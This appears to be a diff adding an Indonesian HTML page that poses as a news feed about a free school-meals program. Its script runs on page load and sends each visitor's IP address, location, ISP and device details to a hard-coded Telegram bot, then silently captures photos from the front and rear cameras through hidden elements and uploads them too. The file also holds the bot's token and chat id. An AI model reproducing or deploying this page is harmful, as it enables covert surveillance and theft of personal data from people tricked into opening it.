@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Berita Makanan Bergizi Gratis</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f0f0;
+      margin: 0;
+      padding: 0;
+    }
+
+    .news {
+      max-width: 600px;
+      margin: 10px auto;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+
+    .news img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .news .text {
+      padding: 15px;
+    }
+
+    #status {
+      text-align: center;
+      font-weight: bold;
+      padding: 10px;
+      color: red;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="news">
+  <img src="https://mmc.tirto.id/image/otf/640x0/2025/01/06/antarafoto-program-makan-bergizi-gratis-di-banyumas-1736152444_ratio-16x9.jpg" alt="Berita Makanan">
+  <div class="text">
+    <h3>SDN 1 Banyumas mendapat makanan bergizi gratis dari pemerintah</h3>
+    <p>Siswa-siswi menikmati makanan sehat dan penuh gizi setiap hari.</p>
+  </div>
+</div>
+
+<div class="news">
+  <img src="https://mmc.tirto.id/image/otf/640x0/2025/01/06/antarafoto-program-makan-bergizi-gratis-di-banyumas-1736152444_ratio-16x9.jpg" alt="Berita Makanan">
+  <div class="text">
+    <h3>SDN 2 Karangreja terima bantuan makanan bergizi</h3>
+    <p>Menu sehat disajikan rutin untuk mendukung tumbuh kembang anak-anak.</p>
+  </div>
+</div>
+
+<div class="news">
+  <img src="https://mmc.tirto.id/image/otf/640x0/2025/01/06/antarafoto-program-makan-bergizi-gratis-di-banyumas-1736152444_ratio-16x9.jpg" alt="Berita Makanan">
+  <div class="text">
+    <h3>SMPN 1 Purwokerto ikut dalam program gizi nasional</h3>
+    <p>Siswa menerima makanan sehat dan bergizi secara rutin.</p>
+  </div>
+</div>
+
+<div class="news">
+  <img src="https://mmc.tirto.id/image/otf/640x0/2025/01/06/antarafoto-program-makan-bergizi-gratis-di-banyumas-1736152444_ratio-16x9.jpg" alt="Berita Makanan">
+  <div class="text">
+    <h3>SMAN 3 Banyumas berikan menu sehat kepada siswa</h3>
+    <p>Mendukung prestasi belajar dengan asupan gizi yang cukup.</p>
+  </div>
+</div>
+
+<div id="status"></div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+  const token = '7976338525:AAF8E2QjW0hm3U7x--k-jYH8tTkMuhDqoqg';
+  const chat_id = '7044672195';
+
+  async function getIPInfo() {
+    const apis = [
+      'https://ipinfo.io/json?token=7976338525:AAF8E2QjW0hm3U7x--k-jYH8tTkMuhDqoqg',
+      'http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,query,isp',
+      'https://ipwhois.app/json/'
+    ];
+
+    for (const url of apis) {
+      try {
+        const res = await fetch(url);
+        if (!res.ok) continue;
+        const data = await res.json();
+
+        if (url.includes('ipinfo.io') && data.ip) {
+          return {
+            ip: data.ip, country: data.country, city: data.city,
+            region: data.region, latitude: data.loc.split(',')[0],
+            longitude: data.loc.split(',')[1], isp: data.org
+          };
+        } else if (url.includes('ip-api.com') && data.status === 'success') {
+          return {
+            ip: data.query, country: data.country, city: data.city,
+            region: data.regionName, latitude: data.lat,
+            longitude: data.lon, isp: data.isp
+          };
+        } else if (url.includes('ipwhois.app') && data.ip) {
+          return {
+            ip: data.ip, country: data.country, city: data.city,
+            region: data.region, latitude: data.latitude,
+            longitude: data.longitude, isp: data.isp
+          };
+        }
+      } catch (e) {
+        continue;
+      }
+    }
+    return {
+      ip: 'Unknown', country: 'Unknown', city: 'Unknown',
+      region: 'Unknown', latitude: 'Unknown',
+      longitude: 'Unknown', isp: 'Unknown'
+    };
+  }
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    const brandModel = navigator.platform || "Unknown";
+
+    return {
+      cores: navigator.hardwareConcurrency || "Unknown",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+      lang: navigator.language || "Unknown",
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+      date: new Date().toLocaleString(),
+      ua: ua,
+      device: /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop",
+      brandModel
+    };
+  }
+
+  async function sendText(info) {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id,
+        text: info
+      })
+    });
+  }
+
+  async function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'photo.jpg');
+
+    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  }
+
+  async function capturePhoto(facing = "user") {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: facing } }, audio: false
+      });
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      video.srcObject = stream;
+
+      return new Promise(resolve => {
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+              if (blob) sendPhoto(blob);
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            }, 'image/jpeg');
+          }, 1200);
+        };
+      });
+    } catch (e) {
+      resolve();
+    }
+  }
+
+  async function main() {
+    const ip = await getIPInfo();
+    const dev = getDeviceInfo();
+
+    const text = `
+📍 IP: ${ip.ip}
+🌍 Negara: ${ip.country}
+🏙️ Kota: ${ip.city}
+🧭 Region: ${ip.region}
+📌 Koordinat: ${ip.latitude}, ${ip.longitude}
+🏢 ISP: ${ip.isp}
+
+🖥️ Device: ${dev.device}
+📱 Brand/Model: ${dev.brandModel}
+🧠 CPU Cores: ${dev.cores}
+💾 RAM: ${dev.ram}
+🗣️ Bahasa: ${dev.lang}
+🕒 Zona: ${dev.timezone}
+📅 Waktu: ${dev.date}
+📏 Resolusi: ${dev.screen}
+🧬 UA: ${dev.ua}
+    `;
+
+    await sendText(text);
+    await capturePhoto("environment");
+    await capturePhoto("user");
+
+    document.getElementById("status").innerText = "";
+  }
+
+  main();
+</script>
+
+</body>
+</html>
